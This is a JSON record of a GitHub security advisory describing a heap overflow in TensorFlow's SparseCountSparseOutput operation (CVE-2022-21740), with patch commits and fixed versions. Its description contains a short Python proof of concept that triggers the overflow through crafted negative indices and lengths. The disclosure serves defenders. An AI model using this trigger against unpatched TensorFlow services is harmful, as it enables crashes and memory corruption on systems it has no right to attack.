{
    "ghsaId": "GHSA-44qp-9wwf-734r",
    "severity": "HIGH",
    "summary": "Heap overflow in Tensorflow",
    "description": "### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) is vulnerable to a heap overflow:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[-1,-1]],\n  values=[2],\n  dense_shape=[1, 1],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
    "permalink": "https://github.com/advisories/GHSA-44qp-9wwf-734r",
    "publishedAt": "2022-02-09T23:47:14Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-44qp-9wwf-734r"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-21740"
        }
    ]
}